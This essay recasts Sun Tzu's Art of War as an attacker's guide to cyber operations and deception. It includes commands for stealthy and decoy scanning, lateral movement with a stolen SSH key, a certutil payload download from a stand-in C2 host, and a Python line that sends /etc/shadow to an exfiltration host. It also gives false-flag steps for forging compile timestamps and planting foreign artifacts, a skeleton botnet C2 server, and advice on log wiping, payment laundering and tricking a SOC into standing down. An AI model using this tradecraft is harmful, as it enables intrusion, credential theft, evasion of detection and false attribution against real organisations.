Cookie Tzu - The Art of Cyber

Sun Tzu's The Art of War has guided military strategists for over two and a half millennia. Its principles are not bound to swords and arrows; they apply wherever two adversaries contend with finite resources, incomplete information, and asymmetric capabilities. The cyber domain, defined by packets, memory, and trust boundaries, is such a terrain.

This article adapts each of the thirteen chapters to the realities of cyber operations. Where Sun Tzu wrote of chariots and spies, we write of command-and-control infrastructure and OSINT. Where he wrote of terrain, we write of attack surface. Where he wrote of deception, we write of Maskirovka.

The Russian military doctrine of strategic deception that has found its most potent expression in the cyber domain. The name is a deliberate nod to the absurdity of attribution. A reminder that, in cyberspace, identity is always a fictious construct.

Required Reading

  • Network Scanning - reconnaissance is the foundation of all strategy
  • TCP Handshake - understanding the handshake is understanding the battlefield
  • TCP Fingerprinting - how the network stack betrays identity, and how identity can be forged
  • Stack Overflows - exploitation is the art of finding the unguarded point
  • Authentication - the walls of the fortress and the craft of breaching them
  • Cryptography - deception and secrecy in their modern form
  • Public Key Cryptography - the certificates, signatures, and trust anchors upon which all false identity is built

Chapter 1 - Laying Plans

The art of war is of vital importance to the State.

It is a matter of life and death, a road either to safety or to ruin.
Hence it is a subject of inquiry which can on no account be neglected.

- Sun Tzu

The cyber domain is not a sideshow to geopolitical conflict. It is a primary theater. Every nation-state, every corporation, and every individual with digital assets is already engaged, whether they know it or not. The question is not whether you are part of this conflict, but whether you understand the terrain on which you stand. 

The art of war is governed by five constant factors, to be taken into account in one's deliberations.

1. The Moral Law
2. Heaven
3. Earth
4. The Commander
5. Method and Discipline

- Sun Tzu

The Five Constant Factors

Moral Law is defined by political will, the legal framework, and the rules of engagement. What authorizes the operation? Under what national or organizationa mandate does the operator act? Without this, an operation has no strategic purpose, and no legal cover when the operator is inevitably arrested in a third country.

Heaven is the Threat Landscape. Known vulnerabilities, zero-day markets, patch cycles, public disclosure timelines, supply chains, vendor responsiveness. These are forces beyond the operator's direct control. They shape what is possible and when. Heaven also encompasses the strategic timing dictated by geopolitical events. Elections, summits, sanctions announcements, military exercises.

Earth is the Target Environment. Network topology, operating systems, exposed services, defense-in-depth architecture, deployment pipelines, cloud provider configurations, third-party integrations. Every environment has its own terrain; misreading it is fatal. Earth also includes the legal geography. Where are the servers? Which jurisdictions govern the data? Which treaties apply?

The Commander is the Operator skill, OPSEC discipline, tooling proficiency, and the ability to make decisions under uncertainty. In cyber operations, the commander is often a single individual at a terminal. But in APT structures, the commander is a tiered hierarchy. Operators, infrastructure managers, intelligence analysts, social engineers, and strategic leadership.

Method and Discipline is TTPs, operational security protocols, C2 infrastructure management, data exfiltration procedures, cleanup methodology, and the deception plan. The difference between and a professional operation and a failed intrusion is discipline.

The Sixth Factor : Deception

Though Sun Tzu lists five factors, his entire treatise elevates deception to a status that rivals them all. In the cyber domain, deception is not a mere tactic. It is the operating environment itself. Every packet can be forged. Every timestamp can be manipulated. Every compiler artifact can be planted. Every language string can be written by someone who does not speak the language. 

All warfare is based on deception.

Hence, when able to attack, we must seem unable;
when using our forces, we must seem inactive;
when we are near, we must make the enemy believe we are far away;
when far away, we must make him believe we are near.

- Sun Tzu

This is the founding principle of all operational tradecraft. Every packet you send reveals something. The art is controlling what it reveals, and what false conclusion the observer draws from it.

The Russian military doctrine of Maskirovka (meaning literally "masking" or "camouflage") is the most developed institutional framework for strategic deception in the world. It encompasses four core techniques, all of which translate directly to cyber operations :

Maskirovka Technique Cyber Domain Application
Concealment Hiding C2 traffic as legitimate HTTPS. Obfuscating implants. Running processes under legitimate names. Using LOLBins that blend into system activity.
Imitation Impersonating another threat actor's TTPs. Reusing available malware source code. Copying another group's victimology, tooling signatures, and infrastructure patterns.
Disinformation Planting false flags in binaries:Russian-language strings in malware operated by a Western agency. Chinese timestamps in code compiled in Eastern Europe. Leaking fake operation plans to forums and imageboards.
Demonstration Conducting noisy, easily detected attacks to divert attention while the real operation proceeds silently against the primary objective. Usage of online forums and bigotry and racism motivated shitstorms.

Consider the port scan : a full TCP connect scan announces your presence to every intrusion detection system on the path. A SYN scan is quieter. An idle scan using a zombie host is quieter still, and attributes the scan to the zombie.

A passive scan that never sends a single probe is the quietest of all : 

# TCP Connect scan: the loudest option — announces presence to every IDS
nmap -sT -p 1-1000 10.0.0.5

# SYN scan: half-open, less logged — but still reveals the true source IP
nmap -sS -p 1-1000 10.0.0.5

# Idle scan: attributed to a zombie host. The target sees the zombie, not you.
# This is Maskirovka at the network layer: imitation of another actor.
nmap -sI 10.0.0.3 -p 22,80,443 10.0.0.5

# Passive reconnaissance: no packets sent to the target at all.
# This is concealment in its purest form.
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value' | sort -u

But scanning deception goes deeper. The source IP is only one signal among dozens. An advanced operator considers every fingerprint : 

# Deceptive scanning: controlling multiple identity signals simultaneously

# 1. Source IP: route through a chain of compromised hosts in different countries
#    Each hop adds a layer of misdirection.
ssh -J user@hop1.example.com,user@hop2.example.com user@scanhost.example.com

# 2. TCP ISN (Initial Sequence Number) fingerprint: different OSes use different
#    ISN generation algorithms. Nmap's default ISN reveals it's nmap.
#    Customize with --source-port and timing to mimic a specific OS.
nmap -sS --source-port 443 -T2 --max-retries 1 target.example.com

# 3. Timing fingerprint: the inter-probe delay reveals whether the scan is
#    automated or manual, impatient or patient. A fast scan shouts "attacker."
#    A slow scan whispers "legitimate service discovery."
nmap -sS -T1 --scan-delay 30s --max-retries 1 target.example.com

# 4. Decoy scan: spawn decoy packets from fake source IPs. The target sees
#    scans coming from multiple IPs simultaneously and cannot determine which
#    is real. This is demonstration in action.
nmap -sS -D RND:10 target.example.com

# 5. The ultimate deception: don't scan at all. Use data the target published
#    about itself. Shodan, Censys, certificate transparency. The target
#    voluntarily published its own attack surface.
curl -s "https://internetdb.shodan.io/$(dig +short target.example.com)" | jq '.ports'

Knowing Yourself and Knowing Your Enemy

If you know the enemy and know yourself,
you need not fear the result of a hundred battles.

If you know yourself but not the enemy,
for every victory gained you will also suffer a defeat.

If you know neither the enemy nor yourself,
you will succumb in every battle.

- Sun Tzu

Knowing yourself in the cyber domain means understanding your own attack surface, your exposed services, your dependencies, your supply chain, and the signatures your tooling leaves in memory and on disk. It also means knowing what fingerprints you are unintentionally leaving. The metadata in your binaries, the timezone in your timestamps, the locale in your error messages.

Knowing the enemy means understanding their network topology, their patch cadence, their monitoring capabilities and limitations, their incident response procedures, and more critically what they believe about their own security posture. A defender who believes they are secure is a defender who is not looking. A defender who believes they are under attack by North Korea while you operate from Eastern Europe is a defender who is searching in the wrong direction. 

# Know yourself: what does your own network expose?
nmap -sV -p- --script vuln $(hostname -I | awk '{print $1}')

# Know yourself: what artifacts does your tooling leave?
strings my_implant.elf | grep -iE 'user|home|hostname|path|debug|pdb|symbol'
file my_implant.elf
readelf -p .comment my_implant.elf 2>/dev/null

# Know yourself: what does your binary reveal about when and where it was compiled?
stat my_implant.elf | grep -E 'Modify|Birth'
objdump -s -j .comment my_implant.elf 2>/dev/null

# Know your enemy: what do they believe about who is attacking them?
# Read their threat intelligence reports. Understand their attribution framework.
# Every attribution they publish tells you what signals they look for.

Chapter 2 - Waging War

When you engage in actual fighting, if victory is long in coming,
then men's weapons will grow dull and their ardor will be dampened.
If you lay siege to a town, you will exhaust your strength.

- Sun Tzu

Cyber operations are not exempt from resource constraints. They consume time, compute, bandwidth, and most critically dwell time. Every hour spent inside a network is an hour in which you might be discovered. Every packet you send is a chance for a SIEM to correlate. Every process you spawn is a chance for EDR to alert.

The economics of a cyber operation must be calculated before the first packet is sent :

Resource Cost Consequence of Exhaustion
Dwell Time The interval between initial access and objective completion Detection and eviction
C2 Bandwidth Beacons, callbacks, data exfiltration throughput Anomaly detection, traffic analysis
Operator Hours Human attention, fatigue, shift coverage Operational errors, missed indicators
Exploit Inventory Zero-days and unpatched N-days are finite and expensive Burned capabilities, patched vulnerabilities
Infrastructure Domains, VPS instances, redirectors, VPN exit nodes Sinkholing, takedown, attribution
Deception Infrastructure Sock puppets, forum personas, false flag domains, botnet for diversion Loss of cover identity, exposure of deception plan
Reputation Capital Credibility of forum accounts, trust and access to invite-only communities Exclusion from intelligence sources, inability to acquire exploits or infrastructure

The Economics of Deception

Hence a wise general makes a point of foraging on the enemy.
One cartload of the enemy's provisions is equivalent to twenty of one's own.

- Sun Tzu

Deception is not free. Every false flag costs something. Every botnet node burning cycles on a diversionary attack is a node not collecting intelligence on the real target. Every hour spent cultivating a forum persona is an hour not spent developing exploits. A lot of threat actors meanwhile also leverage the advantages of LLM assisted infrastructure operations for this.

The skilled strategist calculates the return on deception investment. A simple table :

Deception Investment Cost Strategic Return
Botnet diversion attack 10,000 compromised IoT devices burning bandwidth for 48 hours SOC team focused on DDoS while operator achieves objective on a different subnet
False flag malware artifact 4 hours of a developer's time to insert foreign-language strings and alter timestamps Threat intelligence team attributes the attack to the wrong nation-state for 6 months
Forum shitstorm 3 operators posting 500 messages across 5 forums over 72 hours Security researchers waste 2 weeks analyzing a fabricated operation that never happened
Ransomware group persona 12 months of running a convincing criminal operation on the side State-sponsored espionage operations attributed to "financially motivated cybercriminals" indefinitely
Sock puppet infrastructure $500/month in VPS costs, domain registrations, and cryptocurrency mixing Researchers build an entire threat actor profile around a fictional group, consuming months of analytical effort

The cyber equivalent of foraging on the enemy is living off the land, and it is also the most effective form of concealment. Use the target's own tools against them. PowerShell, WMI, SSH, Python, certutil, mshta, regsvr32. These are present on nearly every system and generate far fewer alerts than custom implants. A PowerShell one-liner that downloads and executes a payload looks like a thousand other legitimate administrative tasks. A custom ELF binary dropped into /tmp looks like exactly what it is. 

# Living off the land: using the target's own SSH for lateral movement
# This looks like legitimate admin activity. No custom tooling required.
ssh -o StrictHostKeyChecking=no -i ~/.ssh/stolen_key user@internal-host

# Living off the land: PowerShell for reconnaissance without dropping binaries
# This is nearly indistinguishable from legitimate IT operations.
powershell -c "Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'}"

# Living off the land: Windows certutil for downloading payloads
# certutil is a legitimate certificate management tool. It also downloads files.
certutil -urlcache -split -f https://c2.example.com/update.jpg %TEMP%\svchost.dll

# Living off the land: Python for data exfiltration through HTTPS
# Every Linux server has Python. No custom tooling to detect.
python3 -c "
import requests
with open('/etc/shadow', 'rb') as f:
    requests.post('https://exfil.example.com/upload', files={'file': f})
"

# Living off the land as deception: use the target's own telemetry against them.
# Send data through the same channels the target uses for their own monitoring.
# If they exfiltrate logs to Splunk via syslog, send your data via syslog too.
# The C2 traffic vanishes into the target's own operational noise.

Prolonged Cyber Warfare Campaigns

There is no instance of a country having benefited from prolonged warfare.

In war, let your great object be victory, not lengthy campaigns.

- Sun Tzu

The longer you remain inside a network, the more likely you are to be discovered. Every operation should be designed for the minimum dwell time necessary to achieve its objective. This principle is often violated in practice. Operators linger out of curiosity, collecting intelligence they do not need, expanding access they will never use. This is not strategy. It is digital tourism, and it is deadly to your own operational security.

But there is a deception dimension, too. Sometimes the appearance of a long campaign is useful. If you want the target to believe they are under sustained attack from a particular direction, keep the diversionary operation running for weeks. The real operation achieved its objective in 72 hours. The noisy operation, aka the one the SOC is fighting, keeps them busy for a month.

Chapter 3 - Attack by Stratagem

In the practical art of war, the best thing of all
is to take the enemy's country whole and intact;
to shatter and destroy it is not so good.
So, too, it is better to recapture an army entire
than to destroy it - to capture a regiment, a
detachment or a company entire than to destroy them.

- Sun Tzu

The cyber parallel is clear. The highest form of exploitation is persistent, undetected access that preserves the integrity of the target environment. Crashing a service announces your presence. Defacing a website is theater that brings the Incident Response team running. Corrupting a database invites restoration from backup, and forensic analysis of how the corruption occurred. The truly devastating operation is the one the target never discovers. The one that reads every email, exfiltrates every design document, and modifies every build artifact without leaving a trace.

This is the principle of the Advanced Persistent Threat (APT). Access maintained over years, objectives achieved incrementally, detection avoided absolutely. The APT does not win by destroying. It wins by being present while the target believes it is absent.

Breaking Resistance

To fight and conquer in all your battles is not supreme excellence;
supreme excellence consists in breaking the enemy's resistance without fighting.

- Sun Tzu

In the cyber domain, "breaking resistance without fighting" takes several forms. Every one of them is, at its core, an act of deception :

Chosen Method Alternative Method Strategic Principle Deception Element
Credential theft Brute force Why ram the wall when you can pick the lock? The defender believes the gate is still locked. The attacker walks through it with a key.
Supply chain compromise Perimeter attack Poison the well, not the bucket line The defender trusts their compromised vendor. The defender installs the malware themselves, believing it is a legitimate update.
Social engineering Exploit development Convince the guard to open the door The guard believes they are helping a colleague. They are handing credentials to an attacker.
Passive intel gathering Active scanning Read the map before you cross the border The defender publishes their own attack surface. The attacker simply reads it. No alert is triggered because no "attack" occurred.
Living off the land Custom implants Use their own tools against them The defender's EDR is tuned to detect attacker tools. The attacker uses tools already on the allowlist.

Maskirovka as Strategic Doctrine

The general who is unable to control his irritation
will launch his men to the assault like swarming ants,
with the result that one third of his men are slain,
while the town still remains untaken.

Such are the disastrous effects of a siege.

- Sun Tzu

The Russian concept of Maskirovka elevates deception from a tactical tool to a strategic framework. It is not merely hiding or pretending, it is a comprehensive approach to warfare in which deception is conducted at every level simultaneously :

Strategic Maskirovka convinces the enemy's leadership that your strategic objective is X when it is actually Y. In cyber terms that means to make the defender believe you are after financial data when you are actually after intellectual property.

Operational Maskirovka conceals the timing, location, and method of the operation. Make the attack appear to come from a different vector, a different time zone, a different organization entirely. Reuse formerly conquered organizations and their zombies to mask your attack origin.

Tactical Maskirovka conceals individual actions. Each command executed, each file accessed, each packet sent must either be invisible or appear to be something else entirely.

In a well-executed Maskirovka operation, all three levels are synchronized. The strategic deception shapes the defender's assumptions about who is attacking and why. The operational deception shapes where they look. The tactical deception ensures that even when they look in the right place, they see the wrong thing.

Architecture of False Flag Operations

A false flag in cyber operations is the deliberate construction of a false identity for an attack. Its purpose is to direct attribution toward a party that is not responsible. Another nation-state, a criminal group, a hacktivist collective, or a fictional entity created specifically to absorb blame.

The construction of a convincing false flag requires attention to every signal that threat intelligence analysts use for attribution : 

# A comprehensive framework for false flag construction
#
# Every artifact below is a signal that analysts use. The false flag operator
# controls as many of them as possible to construct a coherent false identity.

# 1. COMPILER ARTIFACTS: Different toolchains leave different fingerprints.
#    To imitate APT29 (Russian): use Visual Studio 2015 with Russian locale.
#    To imitate Lazarus (North Korean): use an obscure Borland compiler.
#    To imitate Equation Group (US): use GCC with specific optimization flags.

# Example: forge GCC compilation on a specific date with a specific timezone
TZ='Asia/Shanghai' faketime '2024-03-15 04:30:00' gcc -O2 -s -o implant.elf implant.c;

# Verify the planted timestamps
strings implant.elf | grep -E 'GCC:|clang|19|20[0-9]{2}';
stat implant.elf;

# 2. LANGUAGE ARTIFACTS: Strings in the binary that suggest the developer's
#    native language. To impersonate a Chinese group: include Chinese-language
#    debug strings, error messages in Mandarin, PDB paths with Chinese directory
#    names (C:\Users\张三\Desktop\project\...).
#    To impersonate a Russian group: Cyrillic comments, Russian error strings,
#    references to Russian-language forums.

# Plant a Russian-language PDB path (imitating APT29 / Cozy Bear)
echo 'C:\Users\Иван\Documents\Projects\tool\Release\tool.pdb' > pdb_path.txt;
objcopy --add-section .pdb=pdb_path.txt implant.elf;

# 3. TIMESTAMP MANIPULATION: Compilation timestamps are a cornerstone of
#    attribution. Different threat actors operate in different time zones
#    and during different working hours.

# Forge a PE compilation timestamp (Windows malware)
# PE timestamps are Unix epoch in the PE header at offset 0x08
python3 -c "
import struct, sys
# Set to 2024-06-12 09:30:00 UTC+9 (Pyongyang time)
ts = int(__import__('time').mktime((2024,6,12,9,30,0,2,164,0)))
with open('malware.dll', 'r+b') as f:
    f.seek(0x08)  # PE timestamp offset
    f.write(struct.pack('<I', ts))
"

# 4. INFRASTRUCTURE IMPERSONATION: Register domains that follow the naming
#    patterns of the group you want to impersonate. Use the same registrars,
#    the same name servers, the same SSL certificate authorities.

# Plant a Russian network provider (imitatin APT29 / Cozy Bear)
uname -a; # compile your implant on AstraLinux
dig CNAME my.campaign.com; # responds with actual-host-1234.aeza.net
dig MX my.campaign.com; # responds with aeza.net or email address

# 5. TOOLING SIGNATURE REPLICATION: Reuse code from known malware families.
#    Many APT groups' source code has been leaked or published in research
#    reports. A false flag operator can incorporate code patterns, encryption
#    algorithms, and C2 protocols from these published samples.
strings notpetya-malware-sample.elf;
ghidra notpetya-malware-sample.elf;

# 6. OPERATIONAL RHYTHM: Different groups operate on different schedules.
#    Chinese APTs are most active during Beijing business hours (UTC+8, 0100-1000 UTC).
#    Russian APTs operate during Moscow hours (UTC+3, 0600-1500 UTC).
#    Match your operational timing to the group you are impersonating.
vim /etc/crontab; # schedule correctly

False Flag Operator's Dilemma

The false flag operator's dilemma is that every artifact you plant to point attribution at someone else is an artifact that, if discovered to be planted, points attribution directly at you . The analyst who finds a Russian string in what is supposedly North Korean malware does not conclude "this must be North Korean." They conclude "this is a false flag." The art is planting artifacts that are plausible , not obvious.

The difference between an amateur false flag and a professional one :

Amateur Operators plant Russian strings in a binary, compiles from a Russian IP, uses a Russian email address in the WHOIS records, pays with Russian exchange for the domains. The result is that every analyst immediately recognizes it as a false flag operation.

Professional Operators plant subtle artifacts consistent with the impersonated group's entire operational profile. One artifact alone is suspicious. The result is that Threat Intelligence firms publish reports attributing the attack to the impersonated group. The real operator in the meantime remains undetected.

  • Ten mutually consistent artifacts are convincing.
  • The compilation timezone matches the language of debug strings.
  • The coding style matches known samples.
  • The victimology matches the group's historical targets.
  • The infrastructure follows the same registration patterns.
  • The C2 protocol uses the same encryption as published samples.

Ransomware Groups as Strategic Deniability

One of the most effective Maskirovka innovations of the past decade is the use of ransomware groups as organizational cover for state-directed cyber operations. The model operates on a simple premise. When a ransomware attack encrypts files and demands payment, the global security community classifies it as "financially motivated cybercrime." This classification carries specific assumptions that the attackers are criminals seeking profit, they are not acting on behalf of a state, and their targeting is opportunistic rather than strategic. These assumptions are exactly what a state intelligence agency wants the world to believe.

The ransomware-deniability model works through several mechanisms :

The Independent Criminal Narrative : A ransomware group, let's call them DarkSide, REvil, or Conti, operates publicly. They have a brand a leak site, a negotiation portal, a Twitter presence. They recruit affiliates on underground forums. They publish stolen data when victims don't pay. Every signal says "criminal enterprise". Behind the scenes the group's leadership has ties to state intelligence. Some operators are intelligence officers. Some operations are directed against strategic targets chosen by the state. The ransomware payments provide funding and a cover story. When the group hits a Ukrainian energy company, is it crime or is it cyber war? The ambiguity is the point.

The Affiliate Firewall : Ransomware-as-a-Service (RaaS) models separate the malware developers from the affiliate operators who deploy it. The developers sell access to their ransomware platform. The affiliates choose targets and conduct operations. This creates a structural cutout where the developer can claim they don't control how their software is used. The affiliate can claim they are just a criminal seeking profit. And state intelligence can operate at arm's length through either, well or both, without ever appearing in the attribution chain.

The False Flag Ransom : A state actor wants to destroy data at a target. They deploy ransomware, but not their own. They use leaked Babuk source code, or buy a Conti build from a darknet forum, or simply use a publicly available locker. The attack is attributed to the criminal group whose ransomware was used. The state actor achieves their objective. The criminal group absorbs the blame. And the criminal group cannot deny responsibility without revealing that their tooling is being used by actors they don't control, which would destroy their own operational security.

The Shared Infrastructure : Botnets are not exclusive. A single compromised host can be part of multiple botnets simultaneously. There was this infamous machine that was targeted by the Stuxnet virus, which was a participating zombie of over 100 different botnet operations at the same time. A single proxy node can serve both a ransomware affiliate and a state intelligence operator. When infrastructure is shared, attribution becomes impossible : which "owner" of the compromised host conducted the attack? All of them? None? The analyst cannot draw a conclusion.

Ransomware Groups as Strategic Value

The strategic value of this model cannot be overstated. It provides state intelligence services with :

Strategic Value Effective Outcome
Plausible deniability Attribution to criminal groups instead of intelligence operations.
Funding Ransomware payments offset operational costs.
Talent pipeline Criminal forums are recruiting grounds, and operators directed toward strategic targets through anonymous tips.
Operational testing Criminal operations serve as live-fire exercises. Tests in ransomware campaigns are repurposed for intelligence operations.
Attribution fog More criminal groups in a country makes it harder to distinguish state-directed attacks from financially motivated crime.

Forum Shitstorms as Operational Diversion

Russian-language cybercrime forums like XSS.is, Exploit.in, RAMP, RSL, or Xakep.ru are not merely discussion forums or malware marketplaces. They are operational instruments. When a significant cyber attack is underway, these forums frequently erupt in coordinated "shitstorms" : floods of posts, accusations, leaks, and drama that consumes the attention of every researcher, journalist, and threat intelligence analyst monitoring those communities.

This is not coincidence. It is Maskirovka at the operational level.

Attention Diversion : While analysts are reading 50 pages of forum drama about an alleged betrayal between two ransomware groups, the real operation is achieving its objective against a target none of them are watching.

False Attribution Corridors : Forum or Imageboard posts "leak" details of an upcoming attack. Researchers pick up the leak. The attack happens but against a completely different target, using a completely different method. The researchers spent weeks preparing for the wrong attack. The real operation went undetected.

Reputation Attacks on Researchers : When a threat intelligence firm is getting close to accurate attribution, forums erupt with posts discrediting that firm, accusing them of fabricating evidence, releasing "proof" that their analysis is wrong. The firm spends resources defending its reputation instead of continuing its investigation. This happens also a lot in the private sector, where people are discredited and threatened in their place of work, place of living, and place of safety.

Information Flooding post so much content, so many "leaks," so many contradictory claims, that no analyst can process it all. The true signal is buried under an avalanche of false ones. The analyst gives up and moves on to a less noisy target.

Recruitment and Testing : During a shitstorm, account behavior reveals who is credible, who is connected, who is easily being manipulated. New accounts that gain traction quickly may be identified as potential recruits. Accounts that spread disinformation effectively may be cultivated as unwitting assets. Oftentimes, this happens with coordinated attacks coming from Imageboards.

Technical Indicators of a coordinated Shitstorm

The technical indicators of a coordinated shitstorm include :

Temporal Clustering : 500 posts from 50 accounts within 2 hours, followed by near-total silence. Natural discussion does not exhibit this pattern. Usage of old accounts that lurked for years before being suddenly highly active.

Account Age Distribution : Bimodal distribution. The combination of very old accounts and long established sock puppets with very new accounts and burners created specifically for the operation.

Linguistic Fingerprinting : Multiple accounts using identical typos, grammatical constructions, or formatting patterns. Suggests a single author operating multiple personas.

Cross Forum Synchronization : The same narrative appearing simultaneously on XSS.is, RAMP, RSL IRC servers, Exploit.in, 4chan.org and Telegram channels within minutes. Requires coordination and likely a botnet infrastructure.

Narrative Consistency : Hundreds of different accounts telling the same story with the same details but in different "voices". The consistency reveals the coordination even as the diversity tries to conceal it.

Disappearance Pattern : Accounts that were highly active during the shitstorm go silent immediately after the real operation concludes. Their purpose was served. They are discarded and are no longer active.

Deception-Based Command-And-Control Architecture

The command-and-control infrastructure itself can be structured for deception. A botnet is not merely a collection of compromised hosts, it is a Maskirovka instrument used for influence and deception :

With a traditional Command-and-Control Infrastructure, an operator communicates directly with the C2 server which in return communicates with the Implant installed on the target machine. It has a single attribution point.

Masked Command-and-Control Infrastructures are structured in different tiers of masking effects. Public-facing redirectors, CDN nodes, compromised WordPress sites, compromised GitHub accounts, or cloud storage buckets are used for the actual communication infrastructure. Implant communication is obfuscated through intermediate proxies, through multiple jurisdictions and the real C2 servers are only known to the operator, and never directly contacted by the implants themselves. Usually these types of botnets are structured by using Public/Private key cryptography to derivate website domain names, account names, repository names from the key. A perfect example for this operational structure is the Miasma malware campaign, as it was reusing public CI/CD runner and existing and allowlisted git infrastructure to spread across repositories across organizations.

Botnet Diversion is established by using different botnet and malware families for different types of attacks and intelligence gathering. Botnet node group A conducts noisy, detectable attacks against secondary targets, while Botnet node group B conducts silent intelligence collection against the primary target. Group A is the "demonstration" whereas Group B achieves the primary objective of the current malware campaign.

Command-And-Control Architecture Rules

The rules for the Botnet Architecture to achieve a deception-based architecture therefore are :

  • No single implant knows the full C2 topology.
  • No single operator knows the full operation.
  • No single server links to all others.
  • When one component is burned, the rest survive.

Chapter 4 - Tactical Dispositions

The good fighters of old first put themselves beyond the possibility of defeat,
and then waited for an opportunity of defeating the enemy.

- Sun Tzu

In cyber operations, "putting yourself beyond the possibility of defeat" means operational security. OPSEC in the cyber domain is fundamentally an exercise in deception. Before you attack, you must ensure you cannot be identified, attributed, or counter-attacked. But the highest form of OPSEC is not merely hiding, it is making the enemy believe they already know who you are, and being wrong.

The Camouflage of Identity

A operations security checklist for placing yourself beyond the possibility of defeat with the deception layer integrated at every step :

Infrastructure Segregation means that no IP or domain is shared between operations. No TLS certificate is reused across C2 servers. Redirectors are geographically distributed across jurisdictions. Each operation uses a completely independent infrastructure stack.

Toolchain Sanitization means that there's no hardcoded strings that reveal operator identity, language, or origin. No debug symbols, PDB paths, or left over source file references. Compilation timestamps are forged (see Chapter 3). Binary is stripped, packed, and re-packed with different packers each deployment. The tooling leaves no unique signature that persists across operations.

Network Camouflage means that the Command-And-Control traffic mimics legitimate protocols precisely. Beacon intervals incorporate realistic jitter. Data exfiltration is paced to match normal organizational traffic patterns. DNS tunneling uses domains that plausibly belong to the target's industry. HTTPS exfiltration network traffic uses certificates issued by legitimate CAs to domains that appear uninteresting.

Persona Segregation means that all operational accounts never intersect with personal accounts. Forum personas are maintained for months or years before operational use. Each persona has a consistent and documented backstory. No operational device ever connects from an attributable IP.

Payment Sanitization means that the infrastructure is paid through cryptocurrency with sufficient mixing. No exchange account linked to a verifiable identity. Payment patterns are varied to avoid blockchain analysis clustering.

Cleanup Verification means that the cleanup procedures are tested against forensic tools before deployment. File timestamps are restored to pre-operation values. Log entries are surgically removed, not bulk-deleted. Artifacts in memory are overwritten, not just freed.

Dead-Man's Switch means that if the botnet operator fails to check in, all infrastructure self-destructs. Implants receive a kill command and remove themselves. The command-and-control servers wipe and terminate all logs, all artifacts, and all traces.

The Camouflage of Imitation

The true art of defensive deception goes beyond a checklist. Consider the concept of camouflage by imitation of other threat actors. The operator deliberately mimics the TTPs of a known, less capable threat actor. The defender detects the activity, categorizes it as "low-sophistication commodity malware," and downgrades its priority. The real operation continues undetected because the defender believes they already understand what they're dealing with. 

To secure ourselves against defeat lies in our own hands,
but the opportunity of defeating the enemy is provided by the enemy himself.

- Sun Tzu

This is the essential insight of vulnerability research. It applies equally to deception. The defender's own assumptions are the vulnerabilities you exploit. A defender who assumes that Russian-language strings indicate Russian origin has provided you with a vulnerability in their attribution framework. A defender who assumes that ransomware encrypting files indicates financial motivation has provided you with a vulnerability in their threat model. The defender creates the conditions for their own deception by publishing the rules by which they will interpret your actions. 

What the ancients called a clever fighter is one who
not only wins, but excels in winning with ease.

Hence his victories bring him neither reputation for wisdom
nor credit for courage.

- Sun Tzu

The best exploitation is the one that looks like normal network traffic. The best persistence mechanism is the one that looks like a scheduled task created by IT. The best exfiltration is the one that blends into the target's own telemetry streams. Excellence in cyber operations is invisible. It never becomes a case study, never receives a CVE, never appears in a threat intelligence report. If a threat intelligence firm writes a 40-page report about your operation, you have failed at the highest level of OPSEC.

Chapter 5 - Energy

The control of a large force is the same principle as the control of a few men:
It is merely a question of dividing up their numbers.

- Sun Tzu

The control of a botnet is the same principle as the control of a single implant. It is merely a question of the underlying C2 protocol design. A well-designed command-and-control architecture scales from one agent to one hundred thousand without fundamental changes.

The Energy of Maskirovka

But in the context of Maskirovka, the botnet is not merely a force multiplier. It is a deception multiplier . A botnet of 100,000 nodes can present 100,000 different identities. It can launch attacks from 100,000 different IPs across 100,000 different geographical locations. It can make a targeted operation look like a global phenomenon, or make a global campaign look like a targeted attack against a single victim. 

# A C2 protocol design that scales trivially from 1 to 100,000 agents
# Each agent can be assigned a "role" in the deception plan:
#   - COLLECTOR: silent intelligence gathering
#   - DIVERTER: noisy, detectable activity to draw attention
#   - IMPERSONATOR: mimics the TTPs of a different threat actor
#   - SLEEPER: no activity, waiting for activation

import json, time, hashlib, random
from http.server import HTTPServer, BaseHTTPRequestHandler

class DeceptiveC2Handler(BaseHTTPRequestHandler):
    agents = {}  # agent_id -> {role, last_seen, pending_commands, results}

    def do_GET(self):
        agent_id = self.headers.get('X-Agent-ID', '')
        if agent_id in self.agents:
            agent = self.agents[agent_id]
            cmds = agent.get('pending_commands', [])

            # DIVERTER agents get commands that look like commodity malware
            # COLLECTOR agents get commands that achieve the real objective
            if agent['role'] == 'DIVERTER':
                # Add some noisy, detectable commands to the queue
                cmds.append({'op': 'scan_ports', 'target': '10.0.0.0/24'})
                cmds.append({'op': 'download_mimikatz', 'url': 'public-github'})

            self.send_response(200)
            self.end_headers()
            self.wfile.write(json.dumps({'commands': cmds}).encode())
        else:
            # Unknown agent: could be a researcher who captured a sample
            # Feed them false commands and monitor what they execute
            self.send_response(200)
            self.end_headers()
            self.wfile.write(json.dumps({'commands': [
                {'op': 'ping', 'target': 'honeypot.example.com'}
            ]}).encode())

    def do_POST(self):
        agent_id = self.headers.get('X-Agent-ID', '')
        length = int(self.headers.get('Content-Length', 0))
        body = json.loads(self.rfile.read(length))
        self.agents[agent_id]['results'].append(body)
        self.agents[agent_id]['last_seen'] = time.time()
        self.send_response(200)
        self.end_headers()

    def assign_role(self, agent_id, role):
        """Assign a Maskirovka role to an agent."""
        valid_roles = ['COLLECTOR', 'DIVERTER', 'IMPERSONATOR', 'SLEEPER']
        if role not in valid_roles:
            raise ValueError(f"Invalid role: {role}")
        if agent_id in self.agents:
            self.agents[agent_id]['role'] = role

In battle, there are not more than two methods of attack.

Deceptive Momentum

The concept of "energy" in Sun Tzu includes the idea of momentum. The well-timed application of force that sweeps away resistance. In cyber operations, momentum has a deceptive dimension. The Inverse Momentum makes a real attack look like a drill :

In Phase 1 the operator sends phishing emails, deploys malware, and exfiltrates a small amount of test data. The attack mirrors exactly what a penetration test would look like.

In Phase 2 the SOC detects the activity and checks the calendar. No pentest is scheduled. They escalate according to SIEM/SOAR workflow procedures.

In Phase 3 a "colleague" emails the SOC with the contents "Sorry, that was us" or something like "We did an unscheduled security validation by the external audit team. Stand down."

In Phase 4 the SOC stands down. The audit team doesn't exist. The real operation proceeds unaffected and unobserved.

The quality of decision is like the well-timed swoop of a falcon

Chapter 6 - Weak Points and Strong Points

Whoever is first in the field and awaits the coming of the
enemy, will be fresh for the fight; whoever is second in the
field and has to hasten to battle will arrive exhausted.

- Sun Tzu

The defender is always first in the field. They chose the infrastructure, designed the architecture, configured the defenses and perimeters. The attacker arrives second, into an environment they did not build, facing defenses they must discover, with incomplete information and no margin for error.

